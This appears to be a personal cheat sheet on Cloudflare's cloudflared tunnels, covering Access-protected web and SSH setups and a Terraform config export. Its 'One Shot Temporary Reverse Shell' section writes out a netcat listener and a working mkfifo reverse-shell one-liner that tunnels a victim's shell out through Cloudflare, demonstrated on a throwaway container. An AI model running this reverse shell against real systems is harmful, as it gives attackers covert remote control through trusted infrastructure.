# Cloudflared 101

## *REQUIRED* Setup on your Host

```bash
curl -L --output cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared.deb
```

## Protect Web Application

https://one.dash.cloudflare.com/YOUR_ID/access/apps/add

- Register domain (I use personally use https://us-east-1.console.aws.amazon.com/route53/domains/home)
- Add "site" to cloudflare, the tld NS records must point to cloudflare requested ns at https://dash.cloudflare.com/
- Serve your app locally: `cd "$(mktemp -d)" && date | tee index.html && python -m http.server -b 127.0.0.1 1337`
- Create a cloudflare app at https://one.dash.cloudflare.com/ > Access > Applications > Add
    - `Self Hosted` app named `srv`
    - Subdomain is `srv.lalu.tv`
    - Keep `Accept all available identity providers` enabled
- Create a Policy
    - Allow only your auth group, create it at https://one.dash.cloudflare.com/YOUR_ID/access/groups?search=
    - Allow by email list, or valid tld of your corp
- Create a Cloudflared Tunnel `srv` at https://one.dash.cloudflare.com/ > Networks > Tunnels > Add
    - Pick `cloudflared`, name it `srv`
    - Start the tunnel: `sudo cloudflared service install eyJYOUR_TOKEN`
    - You should now see a connector appear, it's your host's link ready to serve content
    - Specify the tunnel's hostname and protocol as `srv.lalu.tv` and `http://127.0.0.1:1337`
- You're DONE!
    - Visit https://srv.lalu.tv/
    - Provide your email & received OTP
    - Profit!
- Once you're done, clean-up stuff
    - https://dash.cloudflare.com/
        - Websites > lalu.tv > DNS > Records > Edit > Delete
        - Zero Trust > Applications > srv > Delete
        - Zero Trust > Network > Tunnels > srv > Delete

## Protect SSH Access + WebUI Bonus

- Register domain (I use personally use https://us-east-1.console.aws.amazon.com/route53/domains/home)
- Add "site" to cloudflare, the tld NS records must point to cloudflare requested ns at https://dash.cloudflare.com/
- Configure your local ssh server (Do it yourself yo!)
- Create a cloudflare app at https://one.dash.cloudflare.com/ > Access > Applications > Add
    - `Self Hosted` app named `ssh`
    - Subdomain is `ssh.lalu.tv`
    - Keep `Accept all available identity providers` enabled
    - Enable `automatic cloudflared authentication` for convenience
    - *Optional* enable `browser rendering` to access ssh over https in your browser
- Create a Policy
    - Allow only your auth group, create it at https://one.dash.cloudflare.com/YOUR_ID/access/groups?search=
    - Allow by email list, or valid tld of your corp
- Create a Cloudflared Tunnel `ssh` at https://one.dash.cloudflare.com/ > Networks > Tunnels > Add
    - Pick `cloudflared`, name it `ssh`
    - Start the tunnel: `sudo cloudflared service install eyJYOUR_TOKEN`
    - You should now see a connector appear, it's your host's link ready to serve content
    - Specify the tunnel's hostname and protocol as `ssh.lalu.tv` and `ssh://127.0.0.1:22`
- You're DONE!
    - For *WEB SSH* access, visit https://ssh.lalu.tv/
    - For *CLI SSH* access, run `ssh -o "ProxyCommand cloudflared access ssh --hostname %h" lalu@ssh.lalu.tv`
    - Provide your email & received OTP
    - Profit!
- Once you're done, clean-up stuff
    - https://dash.cloudflare.com/
        - Websites > lalu.tv > DNS > Records > Edit > Delete
        - Zero Trust > Applications > ssh > Delete
        - Zero Trust > Network > Tunnels > ssh > Delete

---

## One Shot Temporary Reverse Shell

Doc: https://developers.cloudflare.com/cloudflare-one/applications/non-http/arbitrary-tcp/

```bash
## Hacker
cloudflared tunnel login
cloudflared tunnel --hostname oneshot.lalu.tv --url tcp://127.0.0.1:8000 --name oneshot
rlwrap nc -lnvp 8000

## Victim
docker run --rm -it ubuntu:22.04 bash -il
apt update && apt install -y wget
wget https://github.com/cloudflare/cloudflared/releases/download/2024.2.1/cloudflared-linux-amd64 -O /tmp/cloudflared && chmod a+x /tmp/cloudflared && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|/tmp/cloudflared access tcp --hostname oneshot.lalu.tv >/tmp/f

# Double check your tunnel in encrypted
## On Host
sudo tcpdump -A -i enp5s0 port 443 # Encrypted traffic from/to the outer world
sudo tcpdump -A -i lo port 8000    # Plaintext traffic from/to cloudflared and our loopback
for i in {1..20}; do echo "$i"; date; sleep 1; done # Generate identifiable traffic in the newly spawned reverse shell

# Cleanup once you're done
cloudflared tunnel delete oneshot
# No cli option to remove dns record, visit https://dash.cloudflare.com/ > lalu.tv > DNS > recoreds > Edit > Delete
rm ~/.cloudflared/cert.pem # Remove your local tunnel auth
```

---

## Dump Cloudflare Config As Terraform

- https://github.com/cloudflare/cf-terraforming
- https://github.com/jdx/mise

```bash
mise install golang@latest
mise use golang@latest
go install github.com/cloudflare/cf-terraforming/cmd/cf-terraforming@latest
# Setup your token yo!
cat > main.tf << EOF
terraform {
  required_providers {
    cloudflare = {
      source  = "cloudflare/cloudflare"
      version = "~> 4.0"
    }
  }
}
EOF
terraform init
cf-terraforming generate --email "$CLOUDFLARE_EMAIL" --key "$CLOUDFLARE_API_KEY" --zone "$CLOUDFLARE_ZONE_ID" --resource-type "cloudflare_record" | tee -a main.tf
```

## Future ideas

- WAF
- Pages
- Workers
- Analytics & Debugging
